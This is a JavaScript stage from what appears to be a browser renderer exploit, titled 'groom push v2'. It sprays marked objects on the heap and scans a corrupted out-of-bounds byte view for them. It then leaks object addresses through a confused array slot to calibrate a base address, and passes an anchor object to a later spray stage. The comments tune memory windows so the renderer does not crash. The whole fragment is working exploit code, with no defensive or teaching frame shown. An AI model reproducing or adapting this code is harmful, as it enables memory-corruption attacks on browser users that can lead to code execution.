// Groom push v2: walk the object heap into the window, memory-light.
//
// v1 allocated a batch with `push` (repeated butterfly growth) and rescanned
// 12 MiB after each batch. On a draw where the first batch did not anchor it
// died during the second batch: the 12 MiB window is only safe on some draws
// (v8 died between 12 and 16 MiB, and the renderer reported a memory error
// here at 12 MiB on a different base). The 4 MiB window has never crashed.
//
// v2 therefore:
//   * preallocates each 8192-slot batch (one 64 KiB butterfly instead of
//     repeated growth allocations),
//   * scans only 4 MiB after each batch,
//   * stops at 8 batches, which keeps the whole probe inside the harness's
//     30 s budget and the renderer's memory budget.
//
// Markers decode batch-agnostically: the low 16 bits are `batch * 8192 +
// index`, so `low >> 13` is the batch and `low & 0x1fff` the index. The
// marker sits at object+8 in this engine (verified by groom_encoding_v1),
// which is what makes the base calibration exact.
var state = window.__fw14ArrayState;
var result;
try {
  if (!state || !state.view || !state.array || !state.a ||
      state.array[0] !== state.a || !Number.isInteger(state.index))
    throw new Error("groom_preflight_failed");
  var batches = state.groomBatches || (state.groomBatches = []);
  var view = state.view;
  var scanEnd = Math.min(4194304, view.length - 4);
  var rounds = 0, pattern = 0, cand = 0, found = null;
  var firstPatternRound = 0;
  function scan() {
    for (var i = 0; i < scanEnd; i += 8) {
      var b0 = view[i], b1 = view[i + 1], b2 = view[i + 2], b3 = view[i + 3];
      if (b3 !== 0x6b || b2 !== 0) continue;
      pattern++;
      if (!firstPatternRound) firstPatternRound = rounds;
      var low = b0 + b1 * 256;
      var b = low >>> 13, index = low & 0x1fff;
      var other = batches[b];
      if (!other || index >= other.length) continue;
      var object = other[index];
      if (object.marker !== 0x6b000000 + low) continue;
      cand++;
      var ok = false;
      try {
        object.marker = 0x55667788;
        ok = view[i] === 0x88 && view[i + 1] === 0x77 &&
             view[i + 2] === 0x66 && view[i + 3] === 0x55;
      } finally {
        object.marker = 0x6b000000 + low;
      }
      if (!ok) continue;
      var word = "0x";
      try {
        state.array[0] = object;
        for (var w = 7; w >= 0; w--)
          word += view[state.index + w].toString(16).padStart(2, "0");
      } finally {
        state.array[0] = state.a;
      }
      var base = Number(word) + 8 - i;
      if (Number.isSafeInteger(base) && base > 0 && base % 4096 === 0)
        return { index: i, word: word, base: base, batch: b, object: object };
    }
    return null;
  }
  while (!found && rounds < 8 && batches.length < 8) {
    var batchNumber = batches.length;
    var tag = 0x6b000000 + batchNumber * 8192;
    var batch = new Array(8192);
    for (var n = 0; n < 8192; n++) batch[n] = { marker: tag + n };
    batches.push(batch);
    rounds++;
    if (api && typeof api.markSync === "function")
      api.markSync("gp2_round_" + rounds);
    found = scan();
  }
  if (found) {
    // The spray preflight requires the anchor's marker to be 0x11223344 and
    // recomputes its index from the calibrated base, so hand over the exact
    // object that was validated, with the marker the groom would have left.
    found.object.marker = 0x11223344;
    state.addressAnchor = found.object;
    state.calibratedViewBase = found.base;
    result = {
      id: "inrange_anchor_groom_push_v2", status: "pass",
      details: {
        rounds: rounds, batches: batches.length, pattern: pattern,
        cand: cand, found_index: found.index,
        found_base: "0x" + found.base.toString(16),
        found_word: found.word, found_batch: found.batch,
        first_pattern_round: firstPatternRound,
        scan_end: scanEnd, state: "anchored"
      }
    };
  } else {
    result = {
      id: "inrange_anchor_groom_push_v2", status: "fail",
      details: {
        rounds: rounds, batches: batches.length, pattern: pattern,
        cand: cand, found_index: -1, found_base: "", found_word: "",
        found_batch: -1, first_pattern_round: firstPatternRound,
        scan_end: scanEnd, state: pattern > 0 ? "encoding" : "absent"
      }
    };
  }
} catch (e) {
  result = { id: "inrange_anchor_groom_push_v2", status: "error",
    details: { error: String(e).slice(0, 220) } };
}
return [result];
